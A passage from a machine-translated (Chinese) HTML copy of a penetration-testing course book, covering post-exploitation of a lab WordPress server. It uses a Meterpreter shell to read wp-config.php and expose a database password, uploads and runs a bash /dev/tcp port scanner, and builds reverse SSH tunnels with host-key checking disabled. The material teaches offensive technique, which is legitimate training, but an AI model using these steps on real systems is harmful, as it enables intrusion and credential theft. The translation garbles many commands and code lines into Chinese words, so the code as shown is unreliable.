<div style="position:absolute;top:188739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:188756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 9702 已创建。</font></font></nobr></div>
<div style="position:absolute;top:188773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 1 已创建。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:188807;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:188824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/var/www/html/wp-content/plugins/plugin-shell</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:188858;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /var/www/html</font></font></b></nobr></div>
<div style="position:absolute;top:188892;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -alh</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:188909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:188926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 www-data www-data 2.3K Jan 20 2019 wp-comments-post.php </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:189067;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="160"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 160 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:189100;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:190177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:190177;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:190177;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">777</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:189196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 www-data www-data 2.9K Jan 7 2019 wp-config-sample.php</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:189212;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 www-data www-data 2.7K Dec 6 18:07 wp-config.php</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:189229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxrwsr-x 6 www-data www-data 4.0K Dec 9 19:04 wp-content</font></font></nobr></div>
<div style="position:absolute;top:189246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:189280;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫 wp-config.php</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:189297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:189314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">// ** MySQL 设置 - 您可以从您的网络主机获取此信息 ** //</font></font></nobr></div>
<div style="position:absolute;top:189331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/** WordPress 的数据库名称 */</font></font></nobr></div>
<div style="position:absolute;top:189348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义（'DB_NAME'，'wordpress'）；</font></font></nobr></div>
<div style="position:absolute;top:189382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/** MySQL 数据库用户名 */</font></font></nobr></div>
<div style="position:absolute;top:189399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义（'DB_USER'，' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wp</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> '）；</font></font></nobr></div>
<div style="position:absolute;top:189433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/** MySQL 数据库密码 */</font></font></nobr></div>
<div style="position:absolute;top:189450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义（'DB_PASSWORD'，' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Lv9EVQq86cfi8ioWsqFUQyU</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> '）；</font></font></nobr></div>
<div style="position:absolute;top:189484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/** MySQL 主机名 */</font></font></nobr></div>
<div style="position:absolute;top:189501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义（'DB_HOST'，' </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.11</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> '）；</font></font></nobr></div>
<div style="position:absolute;top:189518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:189537;left:355"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 890 - 阅读 wp_config.php</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:189567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在wp_config.php文件中，我们发现数据库IP地址设置为10.5.5.11。</font><font style="vertical-align: inherit;">我们也</font></font></nobr></div>
<div style="position:absolute;top:189586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现了一个 MariaDB 用户名“wp”，这个账户的密码是</font></font></nobr></div>
<div style="position:absolute;top:189605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“Lv9EVQq86cfi8ioWsqFUQyU”。</font><font style="vertical-align: inherit;">为了继续，我们需要巩固我们在网络中的立足点，并且</font></font></nobr></div>
<div style="position:absolute;top:189625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个稳定的枢轴点。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:189659;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.7</font></font></i></nobr></div>
<div style="position:absolute;top:189659;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建稳定的枢轴点</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:189697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在继续之前，让我们回顾一下我们目前拥有的东西。</font><font style="vertical-align: inherit;">我们在 WordPress 盒子上有一个外壳</font></font></nobr></div>
<div style="position:absolute;top:189716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www-data 用户，我们还可以通过 Ajla 网络访问数据库。</font><font style="vertical-align: inherit;">最后，我们只</font></font></nobr></div>
<div style="position:absolute;top:189736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们知道的已发现数据库凭据有效，因为它们已被</font></font></nobr></div>
<div style="position:absolute;top:189755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WordPress 应用程序。</font></font></nobr></div>
<div style="position:absolute;top:189788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，我们知道网络应该类似于图 340。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:189965;left:272"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 340：数据库主机名未知的网络图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:189996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 WordPress 机器和数据库盒在不同的网络上，这是一个好时机</font></font></nobr></div>
<div style="position:absolute;top:190015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用隧道。</font><font style="vertical-align: inherit;">然而，我们的选择是有限的，因为我们的反向 shell 运行在</font></font></nobr></div>
<div style="position:absolute;top:190034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有有效登录 shell (www-data) 的非特权用户帐户的上下文。</font></font></nobr></div>
<div style="position:absolute;top:190067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（客户端）是几乎每个 Linux 发行版中都包含的核心应用程序，因此我们可以</font></font></nobr></div>
<div style="position:absolute;top:190086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试使用它来创建反向隧道。</font><font style="vertical-align: inherit;">一个警告是，由于我们没有 root 访问权限</font></font></nobr></div>
<div style="position:absolute;top:190106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为 www-data 用户创建一个登录名，我们需要在 WordPress 机器上使用 SSH 客户端</font></font></nobr></div>
<div style="position:absolute;top:190125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录到我们的 Kali 服务器以创建隧道。</font><font style="vertical-align: inherit;">简而言之，我们需要一个反向隧道。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:190255;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="161"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 161 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:190288;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:191365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:191365;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:191365;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">778</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:190384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">动态端口转发对我们没有用，因为隧道会走错路。</font></font></nobr></div>
<div style="position:absolute;top:190403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出于同样的原因，本地端口转发也没有用。</font><font style="vertical-align: inherit;">远程端口转发将</font></font></nobr></div>
<div style="position:absolute;top:190422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许我们在 Kali 中打开一个指向 MariaDB 服务器的端口。</font><font style="vertical-align: inherit;">然而这需要我们</font></font></nobr></div>
<div style="position:absolute;top:190442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解内部目标上实际打开了哪些端口。</font></font></nobr></div>
<div style="position:absolute;top:190475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将检查 Nmap 以查看端口扫描是否可以变得更容易，但我们不应该得到我们的</font></font></nobr></div>
<div style="position:absolute;top:190494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">寄予厚望。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:190529;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">映射</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:190546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/sh: 1: nmap: 未找到</font></font></nobr></div>
<div style="position:absolute;top:190565;left:367"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 891 - 检查 Nmap</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:190594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如预期的那样，Nmap 不在服务器上，但无需担心。</font><font style="vertical-align: inherit;">我们可以创建一个快速脚本来扫描</font></font></nobr></div>
<div style="position:absolute;top:190614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主人。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:190648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:190666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机=10.5.5.11</font></font></nobr></div>
<div style="position:absolute;top:190683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于 {1..65535} 中的端口；</font><font style="vertical-align: inherit;">做</font></font></nobr></div>
<div style="position:absolute;top:190700;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">超时 .1 bash -c "echo &gt;/dev/tcp/$host/$port" &amp;&amp;</font></font></nobr></div>
<div style="position:absolute;top:190717;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "端口 $port 已打开"</font></font></nobr></div>
<div style="position:absolute;top:190733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完毕</font></font></nobr></div>
<div style="position:absolute;top:190751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声“完成”</font></font></nobr></div>
<div style="position:absolute;top:190770;left:367"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 892 - Bash 端口扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:190799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本的内容可以保存在名为 portscan.sh 的文件中。</font><font style="vertical-align: inherit;">我们的脚本将迭代每个端口</font></font></nobr></div>
<div style="position:absolute;top:190819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 1 到 65535。对于每个端口，将建立一个超时为 0.1 秒的连接，如果</font></font></nobr></div>
<div style="position:absolute;top:190838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接成功，脚本将回显哪个端口是打开的。</font></font></nobr></div>
<div style="position:absolute;top:190871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个脚本快速而简单；</font><font style="vertical-align: inherit;">然而，它应该为我们提供我们想要的信息。</font><font style="vertical-align: inherit;">跑步</font></font></nobr></div>
<div style="position:absolute;top:190890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本，我们需要将内容转储到文件中。</font><font style="vertical-align: inherit;">一个快速的方法是使用meterpreter</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:190910;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:190944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传 /home/kali/portscan.sh /tmp/portscan.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:190961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传：/home/kali/portscan.sh -&gt; /tmp/portscan.sh</font></font></nobr></div>
<div style="position:absolute;top:190978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传 -1.00 B 的 151.00 B (-0.66%): /home/kali/portscan.sh -&gt; /tmp/portscan.sh</font></font></nobr></div>
<div style="position:absolute;top:190995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传：/home/kali/portscan.sh -&gt; /tmp/portscan.sh</font></font></nobr></div>
<div style="position:absolute;top:191029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:191046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 2924 已创建。</font></font></nobr></div>
<div style="position:absolute;top:191063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 2 已创建。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:191097;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /tmp</font></font></b></nobr></div>
<div style="position:absolute;top:191131;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x 端口扫描.sh</font></font></b></nobr></div>
<div style="position:absolute;top:191165;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./portscan.sh</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:191182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22端口是开放的</font></font></nobr></div>
<div style="position:absolute;top:191199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3306端口是开放的</font></font></nobr></div>
<div style="position:absolute;top:191216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完毕</font></font></nobr></div>
<div style="position:absolute;top:191235;left:343"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 893 - 运行 bash 端口扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:191265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描需要一段时间才能完成，但完成后，我们会看到端口 22 和 3306 已打开。</font></font></nobr></div>
<div style="position:absolute;top:191284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们知道我们需要创建一个隧道来允许 Kali 访问端口 22 和 3306</font></font></nobr></div>
<div style="position:absolute;top:191304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在数据库服务器上。</font><font style="vertical-align: inherit;">完成此操作</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令将类似于以下内容：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:191443;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="162"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 162 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:191476;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:192553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:192553;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:192553;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">779</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:191574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 kali@10.11.0.4 </font></font></nobr></div>
<div style="position:absolute;top:191593;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 894 - ssh 命令的第一次迭代</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:191623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 894 中，我们将在 Kali 上打开端口 1122 以指向 MariaDB 主机上的端口 22。</font><font style="vertical-align: inherit;">接下来，我们</font></font></nobr></div>
<div style="position:absolute;top:191642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还将在 Kali 上打开 13306 以指向 MariaDB 主机上的 3306。</font></font></nobr></div>
<div style="position:absolute;top:191675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们在 meterpreter shell 中运行这个命令，我们很快就会遇到障碍，因为我们</font></font></nobr></div>
<div style="position:absolute;top:191694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有完全交互式的外壳。</font><font style="vertical-align: inherit;">这是一个问题，因为 ssh 会提示我们接受主机密钥</font></font></nobr></div>
<div style="position:absolute;top:191713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并输入 Kali 用户的密码。</font><font style="vertical-align: inherit;">出于安全原因，我们希望</font></font></nobr></div>
<div style="position:absolute;top:191733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">避免在我们刚刚入侵的主机上输入我们的 Kali 密码。</font></font></nobr></div>
<div style="position:absolute;top:191765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过传入两个可选标志来自动接受主机密钥来解决第一个问题</font></font></nobr></div>
<div style="position:absolute;top:191785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的</font></font></nobr></div>
<div style="position:absolute;top:191785;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
<div style="position:absolute;top:191785;left:239"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:191785;left:345"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些</font></font></nobr></div>
<div style="position:absolute;top:191785;left:429"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:191785;left:492"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UserKnownHostsFile=/dev/null</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:191785;left:784"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:191805;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">StrictHostKeyChecking=no </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">第一个选项阻止 ssh 尝试保存主机密钥</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:191824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过将输出发送到 /dev/null。</font><font style="vertical-align: inherit;">第二个选项将指示 ssh 不提示我们接受</font></font></nobr></div>
<div style="position:absolute;top:191843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机密钥。</font><font style="vertical-align: inherit;">这两个选项都可以通过</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">我们更新的命令看起来像</font></font></nobr></div>
<div style="position:absolute;top:191863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下列的：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:191897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o</font></font></nobr></div>
<div style="position:absolute;top:191914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"StrictHostKeyChecking=no" kali@10.11.0.4 </font></font></nobr></div>
<div style="position:absolute;top:191934;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 895 - ssh 命令的第二次迭代</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:191963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们需要防止 ssh 向我们询问密码，我们可以使用 ssh 密钥来做到这一点。</font></font></nobr></div>
<div style="position:absolute;top:191982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将在 WordPress 主机上生成 ssh 密钥，配置 Kali 以接受来自新的登录 -</font></font></nobr></div>
<div style="position:absolute;top:192002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成密钥（并且只允许端口转发），并再次修改 ssh 命令以</font></font></nobr></div>
<div style="position:absolute;top:192021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配我们的更改。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:192056;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录键</font></font></b></nobr></div>
<div style="position:absolute;top:192090;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">光盘键</font></font></b></nobr></div>
<div style="position:absolute;top:192124;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh-keygen</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:192141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成公钥/私钥 rsa 密钥对。</font></font></nobr></div>
<div style="position:absolute;top:192158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中输入文件保存键（/var/www/.ssh/id_rsa）：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/ tmp目录/按键/ id_rsa</font></font></font></b></nobr></div>
<div style="position:absolute;top:192175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入密码（空表示没有密码）： </font></font></nobr></div>
<div style="position:absolute;top:192192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次输入相同的密码： </font></font></nobr></div>
<div style="position:absolute;top:192209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的身份证明已保存在 /tmp/keys/id_rsa 中。</font></font></nobr></div>
<div style="position:absolute;top:192226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的公钥已保存在 /tmp/keys/id_rsa.pub 中。</font></font></nobr></div>
<div style="position:absolute;top:192243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
